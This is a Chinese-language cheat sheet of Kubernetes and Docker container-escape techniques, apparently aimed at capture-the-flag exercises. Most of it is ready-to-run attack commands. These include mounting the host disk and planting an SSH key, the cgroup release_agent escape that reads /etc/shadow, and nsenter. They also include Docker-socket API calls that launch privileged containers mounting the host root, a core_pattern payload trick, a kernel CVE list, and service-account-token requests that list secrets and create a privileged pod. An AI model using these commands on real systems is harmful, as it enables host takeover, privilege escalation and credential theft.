# K8s 容器逃逸技术详解

## 1. 特权容器逃逸

特权容器（`privileged: true`）拥有宿主机所有 Linux capabilities，可直接操作宿主机设备。

### 1.1 磁盘挂载逃逸
```bash
# 查看宿主机磁盘设备
fdisk -l 2>/dev/null || lsblk
# 常见设备：/dev/sda1, /dev/vda1, /dev/xvda1

mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot

# 读取 flag / 写入 SSH 密钥
cat /tmp/hostroot/root/flag.txt
echo "YOUR_SSH_KEY" >> /tmp/hostroot/root/.ssh/authorized_keys

# 完整 chroot
chroot /tmp/hostroot bash
```

### 1.2 cgroup release_agent 逃逸
```bash
# 在特权容器中，利用 cgroup 的 release_agent 机制在宿主机执行命令
d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > $d/w/cgroup.procs"
sleep 1
cat /output
```

### 1.3 nsenter 逃逸（需要 SYS_ADMIN/SYS_PTRACE）
```bash
# 如果有 SYS_ADMIN capability
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

## 2. Docker Socket 逃逸

```bash
# 检查 docker.sock 是否挂载
ls -la /var/run/docker.sock

# 用 curl 操作 Docker API
# 列出容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 创建特权容器并挂载宿主机根目录
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /hostroot/root/flag.txt"],
    "HostConfig": {
      "Binds": ["/:/hostroot"],
      "Privileged": true
    }
  }'

# 启动并查看输出
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/start
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID/logs?stdout=true
```

如果有 docker CLI:
```bash
docker run -v /:/hostroot --privileged -it alpine chroot /hostroot bash
```

## 3. 挂载型逃逸（hostPath）

```bash
# 检查挂载点
mount | grep -v 'proc\|sys\|cgroup\|overlay'
df -h
cat /proc/mounts

# 常见危险挂载
# /var/log → 读取宿主机日志，可能含敏感信息
# /etc → 读取 shadow/passwd，写入 crontab
# / → 完全访问宿主机
```

如果挂载了 `/var/log`:
```bash
# 通过 symlink 技巧读取宿主机文件
ln -s /etc/shadow /var/log/shadow-link
# 等待日志轮转或触发日志读取
```

## 4. Procfs 逃逸（/proc/sysrq-trigger）

```bash
# 需要挂载了宿主机的 /proc
# 检查 core_pattern
cat /proc/sys/kernel/core_pattern
# 如果可写:
echo "|/path/to/payload" > /proc/sys/kernel/core_pattern
# 触发 core dump → 宿主机执行 payload
```

## 5. 内核漏洞逃逸

容器与宿主机共享内核，内核漏洞可直接逃逸：

| 漏洞 | 内核版本 | CVE |
|------|---------|-----|
| DirtyPipe | 5.8 - 5.16.11 | CVE-2022-0847 |
| DirtyCow | 2.6.22 - 4.8.3 | CVE-2016-5195 |
| OverlayFS | 5.11 - 5.15 | CVE-2021-3493 |
| runc | runc < 1.0-rc6 | CVE-2019-5736 |
| containerd | < 1.3.9 | CVE-2020-15257 |

### CVE-2019-5736（runc 逃逸，经典）
```bash
# 覆盖宿主机的 runc 二进制
# 需要在容器内执行，下次 docker exec 进入时触发
# 工具：https://github.com/Frichetten/CVE-2019-5736-PoC
```

## 6. Service Account Token 利用

即使无法逃逸容器，SA Token 可能有集群级别权限：
```bash
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 检查能否列出 secrets（高价值）
curl -sk -H "Authorization: Bearer $SA_TOKEN" $APISERVER/api/v1/secrets

# 检查能否创建 Pod（→ 创建特权 Pod 逃逸）
curl -sk -H "Authorization: Bearer $SA_TOKEN" $APISERVER/api/v1/namespaces/default/pods \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"pwned"},"spec":{"containers":[{"name":"pwned","image":"alpine","command":["sleep","infinity"],"securityContext":{"privileged":true}}],"hostNetwork":true,"hostPID":true}}'
```

## 7. 环境变量信息泄露

K8s 将 Service 信息注入环境变量：
```bash
env | sort
# 可发现其他服务的 IP 和端口
# MYSQL_SERVICE_HOST=10.96.x.x
# REDIS_SERVICE_HOST=10.96.x.x
```
